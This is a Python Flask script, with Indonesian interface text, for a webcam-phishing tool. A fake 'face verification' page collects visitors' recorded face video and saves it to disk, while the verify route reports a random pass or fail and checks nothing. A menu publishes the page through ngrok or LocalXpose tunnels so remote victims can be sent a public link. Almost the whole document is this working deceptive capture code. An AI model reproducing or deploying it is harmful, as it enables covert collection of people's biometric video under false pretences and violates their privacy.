from flask import Flask, render_template, request, jsonify
import os
from datetime import datetime
import random
import subprocess
import threading
import time
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# ========== BANNER & AUTHOR ========== #
def show_banner():
    print(Fore.CYAN + r"""
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##

    """)
    print(Fore.YELLOW + " " * 20 + "Created by " + Fore.MAGENTA + "Rivaile")
    print("\n" + "=" * 60 + "\n")

# ========== TOKEN HANDLER ========== #
def get_token(service_name, file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            token = f.read().strip()
        return token

    print(Fore.CYAN + f"\nMasukkan {service_name} Token Anda (kosongkan jika sudah pernah tersimpan):")
    token = input("> ").strip()

    if token:
        with open(file_path, 'w') as f:
            f.write(token)
        print(Fore.GREEN + f"{service_name} token berhasil disimpan!\n")
    else:
        print(Fore.YELLOW + f"Menggunakan token lama jika tersedia.\n")

    return token

# ========== TUNNEL OPTIONS ========== #
def start_ngrok(port):
    try:
        from pyngrok import ngrok
        token = get_token("Ngrok", "ngrok_token.txt")
        if token:
            ngrok.set_auth_token(token)
        tunnel = ngrok.connect(port, bind_tls=True)
        public_url = tunnel.public_url
        print(Fore.GREEN + f"\n🔥 NGROK URL: {public_url}")
        with open("ngrok_url.txt", "w") as f:
            f.write(public_url)
        return public_url
    except Exception as e:
        print(Fore.RED + f"Ngrok error: {e}")
        return None

def start_localxpose(port):
    try:
        token = get_token("LocalXpose", "localxpose_token.txt")
        if token:
            os.system(f"loclx auth {token}")

        cmd = f"loclx tunnel http --to localhost:{port}"
        process = subprocess.Popen(
            cmd.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        print(Fore.YELLOW + "🔄 Menunggu LocalXpose memulai tunnel...")

        for _ in range(10):
            output = process.stdout.readline()
            if "https://" in output:
                url = output.strip().split()[-1]
                print(Fore.GREEN + f"\n🌐 LOCALXPOSE URL: {url}")
                with open("localxpose_url.txt", "w") as f:
                    f.write(url)
                return url

        print(Fore.RED + "❌ Tidak berhasil mendeteksi URL dari LocalXpose.")
        return None

    except Exception as e:
        print(Fore.RED + f"Localxpose error: {e}")
        return None

# ========== ROUTES ========== #
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/verify', methods=['POST'])
def verify():
    if 'face_data' not in request.files:
        return jsonify({"status": "error", "message": "Data wajah tidak ditemukan"})
    
    file = request.files['face_data']
    filename = f"face_{datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
    file.save(os.path.join(UPLOAD_FOLDER, filename))
    
    is_success = random.random() > 0.3
    return jsonify({
        "status": "success" if is_success else "failed",
        "message": "Verifikasi berhasil!" if is_success else "Wajah tidak dikenali",
        "sound": "success" if is_success else "error"
    })

# ========== MENU UTAMA ========== #
def show_menu():
    print(Fore.BLUE + "\nPilih tunneling service:")
    print(Fore.YELLOW + "1. Ngrok (Recommended)")
    print(Fore.YELLOW + "2. LocalXpose")
    print(Fore.YELLOW + "3. Tanpa tunneling (Local only)")
    print(Fore.RED + "4. Exit")

def run_server():
    show_banner()
    
    while True:
        show_menu()
        choice = input(Fore.CYAN + "\nPilihan (1-4): ").strip()
        
        if choice == "4":
            print(Fore.RED + "\nKeluar dari program...")
            os._exit(0)
            
        port = 5000
        
        # Jalankan Flask di thread terpisah
        flask_thread = threading.Thread(
            target=lambda: app.run(
                host='0.0.0.0',
                port=port,
                debug=False,
                use_reloader=False
            )
        )
        flask_thread.daemon = True
        flask_thread.start()
        
        time.sleep(3)  # Tunggu Flask startup
        
        if choice == "1":
            url = start_ngrok(port)
            if url:
                print(Fore.GREEN + f"\nServer aktif di: {url}")
        elif choice == "2":
            url = start_localxpose(port)
            if url:
                print(Fore.GREEN + f"\nServer aktif di: {url}")
        elif choice == "3":
            print(Fore.YELLOW + f"\nServer lokal berjalan di: http://localhost:{port}")
        else:
            print(Fore.RED + "\nPilihan tidak valid!")
            continue
        
        print(Fore.BLUE + "\nTekan Enter untuk kembali ke menu atau 'q' untuk keluar")
        if input().lower() == 'q':
            os._exit(0)
        
        os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == '__main__':
    try:
        run_server()
    except KeyboardInterrupt:
        print(Fore.RED + "\nProgram dihentikan!")
        os._exit(0)
